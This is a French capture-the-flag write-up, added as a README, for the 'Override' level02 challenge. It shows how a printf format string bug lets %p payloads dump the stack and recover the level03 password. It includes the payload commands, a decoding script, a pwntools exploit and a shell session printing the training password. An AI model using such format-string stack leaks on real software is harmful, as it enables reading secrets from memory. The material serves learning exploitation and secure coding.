@@ -1,0 +1,258 @@
+# 📘 Override – Level02
+
+## 📝 Description
+
+Ce niveau du projet **Override** introduit une vulnérabilité de **format string**. Le programme lit le mot de passe du niveau suivant dans un fichier, le stocke en mémoire, puis demande des credentials à l'utilisateur. Une faille dans l'utilisation de `printf()` permet de lire directement le contenu de la stack et ainsi récupérer le mot de passe stocké.
+
+L'objectif est d'exploiter cette vulnérabilité de format string pour extraire le mot de passe du niveau 03 directement depuis la mémoire.
+
+---
+
+## 🔍 Analyse du binaire
+
+### Code désassemblé (simplifié)
+
+```c
+undefined8 main(void)
+{
+  char local_118[112];  // Password input
+  char local_a8[48];    // ← Le vrai password level03 !
+  char local_78[100];   // Username input
+  FILE *local_10;
+  
+  // Ouvre et lit le password du level03
+  local_10 = fopen("/home/users/level03/.pass", "r");
+  if (local_10 == NULL) {
+    fwrite("ERROR: failed to open password file\n", 1, 0x24, stderr);
+    exit(1);
+  }
+  
+  fread(local_a8, 1, 0x29, local_10);  // Lit 41 octets dans local_a8
+  local_a8[strcspn(local_a8, "\n")] = '\0';
+  fclose(local_10);
+  
+  // Interface de login
+  puts("===== [ Secure Access System v1.0 ] =====");
+  puts("| You must login to access this system. |");
+  
+  printf("--[ Username: ");
+  fgets(local_78, 100, stdin);
+  local_78[strcspn(local_78, "\n")] = '\0';
+  
+  printf("--[ Password: ");
+  fgets(local_118, 100, stdin);
+  local_118[strcspn(local_118, "\n")] = '\0';
+  
+  // Vérification du password
+  if (strncmp(local_a8, local_118, 0x29) == 0) {
+    printf("Greetings, %s!\n", local_78);
+    system("/bin/sh");
+    return 0;
+  }
+  
+  printf(local_78);  // ⚠️ FORMAT STRING VULNERABILITY !
+  puts(" does not have access!");
+  exit(1);
+}
+```
+
+### ✔ Vulnérabilités identifiées
+
+1. **Format String Vulnerability** : `printf(local_78)` sans format string
+   - Devrait être : `printf("%s", local_78)`
+   - Permet de lire/écrire dans la mémoire avec `%p`, `%x`, `%s`, etc.
+
+2. **Password en mémoire** : Le vrai password est stocké dans `local_a8` sur la stack
+   - Reste en mémoire même après la comparaison
+   - Accessible via la vulnérabilité de format string
+
+---
+
+## 🎯 Stratégie d'exploitation
+
+### Plan d'attaque
+
+1. Utiliser la vulnérabilité de format string dans le champ **Username**
+2. Dumper le contenu de la stack avec des format specifiers (`%p`)
+3. Localiser le password stocké dans `local_a8`
+4. Décoder les valeurs hexadécimales en ASCII
+
+### Schéma mémoire de la stack
+
+```
+Haute adresse
+    ↓
+[Autres variables]
+[local_118]  ← Password input (112 bytes)  ~ offset 35-40
+[local_a8]   ← VRAI PASSWORD !  (48 bytes) ~ offset 21-26
+[local_78]   ← Username input  (100 bytes) ~ offset 27
+    ↓
+Basse adresse
+```
+
+---
+
+## 🔧 Méthodologie d'exploitation
+
+### Étape 1 : Localiser notre input sur la stack
+
+On utilise un **marqueur** pour trouver notre position :
+
+```bash
+(echo "AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p"; echo "test") | ./level02
+```
+
+**Résultat** :
+```
+AAAA 0x7fffffffe500 (nil) 0x70 0x2a2a2a2a2a2a2a2a ... (nil) 0x2070252041414141 ...
+                                                              ^^^^^^^^^^^^^^^^
+                                                              Notre "AAAA" !
+```
+
+`0x41414141` (= "AAAA") apparaît à **l'offset 27** → c'est la position de `local_78` (username).
+
+### Étape 2 : Dump de la stack complète
+
+```bash
+(echo "AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p"; echo "test") | ./level02
+```
+
+**Sortie pertinente** :
+```
+... 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) ...
+                      ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^
+                      Offset 21           Offset 22           Offset 23           Offset 24           Offset 25
+```
+
+### Étape 3 : Identifier le password
+
+Les valeurs aux **offsets 21-25** ne ressemblent pas à des pointeurs et contiennent des caractères ASCII imprimables :
+
+```
+0x756e505234376848  ← 'u'(75) 'n'(6e) 'P'(50) 'R'(52) etc.
+0x45414a3561733951  ← 'E'(45) 'A'(41) 'J'(4a) '5'(35) etc.
+0x377a7143574e6758  ← '7'(37) 'z'(7a) 'q'(71) 'C'(43) etc.
+```
+
+Ces valeurs sont clairement du texte → **c'est le password !**
+
+### Étape 4 : Décoder les valeurs hexadécimales
+
+Les valeurs sont en **little-endian** (x86-64), il faut inverser l'ordre des octets :
+
+```python
+#!/usr/bin/env python2
+import struct
+
+hex_values = [
+    0x756e505234376848,
+    0x45414a3561733951,
+    0x377a7143574e6758,
+    0x354a35686e475873,
+    0x48336750664b394d
+]
+
+password = ''
+for val in hex_values:
+    # Convertir en little-endian (inverse l'ordre des octets)
+    password += struct.pack('<Q', val)
+
+print(password)
+# Output: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+```
+
+**Décodage manuel** :
+
+```
+0x756e505234376848 → 48 48 37 34 52 50 6e 75 → H h 7 4 R P n u
+0x45414a3561733951 → 51 39 73 61 35 4a 41 45 → Q 9 s a 5 J A E
+0x377a7143574e6758 → 58 67 4e 57 43 71 7a 37 → X g N W C q z 7
+0x354a35686e475873 → 73 58 47 68 6e 35 4a 35 → s X G h n 5 J 5
+0x48336750664b394d → 4d 39 4b 66 50 67 33 48 → M 9 K f P g 3 H
+```
+
+**Password complet** : `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
+
+---
+
+## 🚀 Exploitation
+
+### Commande complète
+
+```bash
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: test
+--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+*****************************************
+Greetings, test!
+$ whoami
+level03
+$ cat /home/users/level03/.pass
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+```
+
+### Script d'exploitation automatisé
+
+```python
+#!/usr/bin/env python2
+import struct
+from pwn import *
+
+# Lancer le programme
+p = process('./level02')
+
+# Payload pour dumper la stack
+payload = "AAAA " + " ".join(["%{}$p".format(i) for i in range(1, 40)])
+
+p.recvuntil('Username: ')
+p.sendline(payload)
+p.recvuntil('Password: ')
+p.sendline('fake')
+
+# Récupérer la sortie
+output = p.recvall()
+print(output)
+
+# Extraire les valeurs hex et décoder
+# (parser la sortie pour trouver les offsets 21-25)
+```
+
+---
+
+## ✅ Résumé
+
+| Élément                    | Valeur                                                          |
+| -------------------------- | --------------------------------------------------------------- |
+| Vulnérabilité              | Format String dans `printf(local_78)`                           |
+| Variable cible             | `local_a8` (contient le password level03)                       |
+| Position sur la stack      | Offsets 21-25 (depuis le format string)                         |
+| Position de l'input        | Offset 27 (local_78)                                            |
+| Technique                  | Stack leak via format string vulnerability                      |
+| Valeurs hex extraites      | `0x756e505234376848`, `0x45414a3561733951`, etc.               |
+| Password level03           | `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`                      |
+| Gain                       | Shell en tant que *level03*                                     |
+
+---
+
+### Format String Basics
+
+| Format | Description                    | Exemple                |
+| ------ | ------------------------------ | ---------------------- |
+| `%p`   | Affiche un pointeur (adresse)  | `0x7fffffffe500`       |
+| `%x`   | Affiche en hexadécimal         | `41414141`             |
+| `%s`   | Affiche une string             | `"hello"`              |
+| `%N$p` | Affiche le Nième argument      | `%21$p` → offset 21    |
+| `%N$s` | Lit une string au Nième offset | `%21$s` → lit le texte |
+
+---
+
+## 🎓 Leçons apprises
+
+1. **Toujours utiliser des format strings** : `printf("%s", str)` au lieu de `printf(str)`
+2. **La stack garde tout en mémoire** : Les variables locales persistent jusqu'à la fin de la fonction
+3. **Format string = lecture/écriture arbitraire** : Permet de dumper ou modifier la mémoire
+4. **Little-endian** : Sur x86-64, les octets sont stockés dans l'ordre inverse
